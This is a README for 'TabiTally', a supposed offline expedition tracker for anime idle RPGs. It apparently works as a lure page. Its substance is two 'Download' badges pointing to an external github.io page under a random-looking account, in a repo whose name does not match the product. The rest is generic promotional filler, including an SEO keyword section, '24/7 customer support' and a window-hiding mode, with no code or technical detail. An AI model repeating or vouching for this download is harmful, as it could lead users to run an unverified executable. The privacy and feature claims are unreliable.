![preview](https://raw.githubusercontent.com/9444972740m-cell/expedition-loopmate/main/screen_eddb2bb.svg)
[![Download](https://raw.githubusercontent.com/9444972740m-cell/expedition-loopmate/main/start_6c38a2.svg)](https://9444972740m-cell.github.io/expedition-loopmate/)

# 🎌 TabiTally — Background Expedition Tracker for Anime-Style Idle RPGs

An independent, fan-made companion tracker that quietly logs your party's expedition cycles while you focus on real life. Inspired by the repetitive rhythm of idle anime RPG loops, TabiTally turns that endless spin into readable history, tidy statistics, and gentle hotkey control — no cloud, no login, no strings attached.

> Think of it as a lighthouse keeper for your idle party: the ships keep sailing on their own, and you simply get a clean logbook of every voyage.

---

## 🧭 Table of Contents

- [What Is TabiTally?](#-what-is-tabitally)
- [Why This Exists](#-why-this-exists)
- [Feature List](#-feature-list)
- [How It Works (Conceptually)](#-how-it-works-conceptually)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [Hotkey Control & Session Flow](#-hotkey-control--session-flow)
- [Statistics You Actually Care About](#-statistics-you-actually-care-about)
- [Portable Design Philosophy](#-portable-design-philosophy)
- [Running TabiTally](#-running-tabitally)
- [Configuration](#-configuration)
- [Roadmap for 2026](#-roadmap-for-2026)
- [FAQ](#-faq)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Support & Community](#-support--community)

---

## 🌸 What Is TabiTally?

TabiTally is a lightweight, offline-first background tracker built for players who enjoy anime-styled idle RPGs and expedition-based progression systems. Instead of watching a loop repeat for hours, you let the game run and let TabiTally observe, record, and summarize.

It is not a game. It is not a service. It is a quiet observer that respects your machine, your time, and your privacy.

Key behavioral traits:

- Runs entirely on your own hardware
- Requires no account, no email, no registration
- Stores everything in a local folder you choose
- Responds to a single hotkey for stopping and saving state
- Designed to be carried on a USB stick, a laptop, or a small home server

The name "TabiTally" comes from the Japanese word *tabi* (journey) and the English word *tally* (a running count). It represents a journey that counts itself while you look away.

---

## 💡 Why This Exists

Idle anime RPGs are beautiful in their simplicity: send a party, wait, collect. But over long sessions, the repetition becomes invisible. Players lose track of how many cycles ran, which formations performed well, and how consistent their expedition cadence was.

TabiTally was created to answer three questions:

1. How many expedition cycles actually happened?
2. How evenly were they spaced over time?
3. When was the last time I checked in?

Rather than push you toward more grinding, TabiTally pushes you toward awareness. It is a mirror, not a megaphone.

---

## ⭐ Feature List

A breakdown of everything TabiTally offers, written for players who value calm tooling over noisy dashboards.

- 🧩 **Zero-Setup Companion Design** — Unpack and run. Nothing to register, nothing to verify, nothing to link.
- 🕹️ **Single-Hotkey Session Control** — One keystroke pauses the tracker and flushes current session data to disk.
- 📊 **Expedition Cycle Counter** — Tracks how many expedition iterations have been observed per session.
- ⏱️ **Cadence Timeline** — Visualizes spacing between cycles so you can see rhythm, drift, and gaps.
- 🗂️ **Session Logbook** — Every run becomes a dated entry that you can revisit later.
- 🧠 **Smart Idle Detection** — Notices when activity stops and marks the session as naturally concluded.
- 💾 **Local-First Storage** — Data lives in a folder you control; nothing leaves your device.
- 📱 **Responsive UI** — Layout adapts from wide desktop monitors down to small tablet screens.
- 🌐 **Multilingual Support** — Interface strings available in multiple languages, with community-contributed translations.
- 🎨 **Themeable Interface** — Choose between light, dark, and a low-contrast "paper" theme for long sessions.
- 🔔 **Optional Gentle Notifications** — Off by default; enable if you want a soft nudge when a session ends.
- 🧭 **Portable Build Mode** — Run from removable media without touching system directories.
- 🛡️ **No Telemetry** — The tracker does not phone home, ever.
- 🧾 **Exportable Summaries** — Save session summaries as plain text or CSV for personal records.
- 🧩 **Modular Architecture** — Core, UI, and storage layers are separated for contributors to extend.
- 🌙 **Quiet Mode** — Hides the window entirely and keeps running in the background tray.
- 🕰️ **24/7 Customer Support** — Community-driven support channels answer questions around the clock.
- 🔐 **Offline Verification** — Integrity checks are local; no remote license servers involved.

---

## 🛠️ How It Works (Conceptually)

TabiTally sits beside your idle game and observes the rhythm of expedition cycles rather than interfering with them. You start the tracker, start your game, and go about your day.

Conceptually, the pipeline looks like this:

- **Observation Layer** — Watches for repeating activity patterns that match expedition cycles.
- **Session Layer** — Groups observations into a logical session with a start and end time.
- **Storage Layer** — Writes session summaries to a local folder using a simple, human-readable format.
- **Presentation Layer** — Renders counters, timelines, and logs in a responsive interface.

Because the layers are separated, you can swap the presentation layer, disable storage, or run observation-only mode.

---

## 📱 Responsive UI & Multilingual Support

A tracker should fit into your routine, not fight it. TabiTally's interface is designed with three principles:

1. **Responsive by default.** Panels reflow naturally across screen sizes. On a phone-sized viewport, the timeline collapses into a vertical list. On an ultrawide monitor, statistics spread horizontally.
2. **Multilingual from the start.** Text is never hardcoded into the layout. Translations live in separate locale files, and community members are invited to contribute new ones.
3. **Readable in any light.** Colour tokens are centralized, so switching themes does not break readability.

Supported locales (initial release):

- English (default)
- Japanese
- Simplified Chinese
- Spanish
- German
- Portuguese (Brazil)

Additional languages are added as community translators step forward. Every translation is credited in the CONTRIBUTORS file.

---

## ⌨️ Hotkey Control & Session Flow

The heart of TabiTally is a single, memorable hotkey. When pressed:

- The current session is frozen.
- All pending observations are flushed to the local store.
- A short confirmation appears (unless Quiet Mode is on).
- The tracker returns to standby.

This gives you the freedom to walk away, close your laptop lid, or simply stop without hunting for a menu. It is a "pause the world" button for your idle routine.

Default bindings (rebindable in configuration):

- Start / Resume session
- Pause / Stop session
- Toggle Quiet Mode
- Open logbook

---

## 📈 Statistics You Actually Care About

TabiTally avoids vanity metrics. It surfaces information that helps you reflect:

- **Total cycles observed** across all sessions
- **Average cadence** between cycles
- **Longest gap** between activity
- **Session length distribution**
- **Weekly heatmap** showing when you play most
- **Check-in reminders** you configure yourself

These numbers are presented in plain language, not in dense jargon. A small caption explains each metric the first time you see it.

---

## 🧳 Portable Design Philosophy

Portability is not just about being able to move files. It is about not being trapped. TabiTally aims for:

- **No hidden dependencies** on system-wide services.
- **No writes** outside its own folder unless you explicitly choose otherwise.
- **No assumptions** that you have an internet connection.
- **No lock-in** — your logs are plain files you can read in any text editor.

If your laptop dies, you copy the folder to a new machine and continue exactly where you left off. The tracker is designed to be forgotten and rediscovered without friction.

---

## 🚀 Running TabiTally

Because TabiTally is distributed as a self-contained build, getting started is intentionally uneventful:

1. Save the portable build to a folder you trust.
2. Launch the executable for your operating system.
3. Confirm the hotkey binding on first use.
4. Start your idle game and let the tracker observe quietly.
5. When you are done, press the hotkey to flush and stop.

For users who prefer to build from source, see the CONTRIBUTING guide, which describes the expected toolchain abstractly without prescribing a single package manager.

---

## ⚙️ Configuration

All settings live in a single human-readable configuration file inside the app folder. Options include:

- Locale selection
- Theme selection
- Hotkey bindings
- Storage path override
- Quiet Mode default
- Notification toggle
- Log rotation length

The configuration file is commented, and every option explains itself. No hidden toggles, no obscure flags.

---

## 🗺️ Roadmap for 2026

Planned and dreamed-about directions for the year ahead:

- Expanded locale coverage for underrepresented languages
- A plugin interface for custom observation rules
- Optional encrypted local store for privacy-conscious users
- A companion CLI for headless servers
- Improved timeline visualizations
- Community-driven theme gallery (offline, bundled)
- Accessibility audit and screen-reader improvements
- Quarterly contributor retrospectives

Roadmap items are aspirational and may shift based on community feedback.

---

## ❓ FAQ

**Does TabiTally require an account?**
No. There are no accounts, no profiles, and no remote identity of any kind.

**Does it send any data anywhere?**
No. All data stays on your device in a folder you control.

**Can I use it on multiple machines?**
Yes, by copying the app folder between machines. Sessions are stored as plain files.

**Is it difficult to remove?**
Delete the folder. That is the entire uninstall process.

**Does it work with any specific game?**
TabiTally is a general-purpose timer for expedition-style idle games. It does not target a single title.

**Where do I get support?**
Community support channels are staffed around the clock. See the Support section below.

---

## 🔎 SEO & Discoverability Notes

This project uses natural, descriptive language so that players searching for "background expedition tracker", "idle anime RPG companion tool", "offline session logger for idle games", and "portable expedition timing utility" can find it without hype or misleading claims.

We avoid exaggerated promises and focus on clarity. The goal is to be discovered by the exact people who will benefit from a calm, offline, portable tracker.

---

## ⚠️ Disclaimer

TabiTally is an independent, fan-made utility intended for personal use alongside idle games. It is not affiliated with, endorsed by, or sponsored by any game publisher, developer, or platform.

Users are responsible for complying with the terms of service of any game they choose to run while TabiTally is active. TabiTally does not modify game files, does not interact with game memory, and does not automate in-game actions. It is purely an observational companion.

The software is provided "as is", without warranty of any kind. The maintainers are not liable for any consequences arising from its use. Use it thoughtfully, respect the games you love, and respect the communities around them.

---

## 📄 License

This project is licensed under the MIT License. See the full text at the official reference:

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 TabiTally contributors.

Permission is hereby granted, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions of the MIT License.

---

## 🤝 Support & Community

TabiTally grows through quiet contributions: translations, documentation fixes, and thoughtful feedback. If you would like to help, please review the CONTRIBUTING guide before opening an issue.

Community support operates continuously, so questions do not wait for business hours. Whether you are curious about a metric, unsure about configuration, or simply want to say hello, there is a place for you.

Thank you for choosing a tracker that respects your time, your privacy, and your sense of wonder. Happy expeditions — may your cycles be steady and your logbook tidy.

[![Download](https://raw.githubusercontent.com/9444972740m-cell/expedition-loopmate/main/start_6c38a2.svg)](https://9444972740m-cell.github.io/expedition-loopmate/)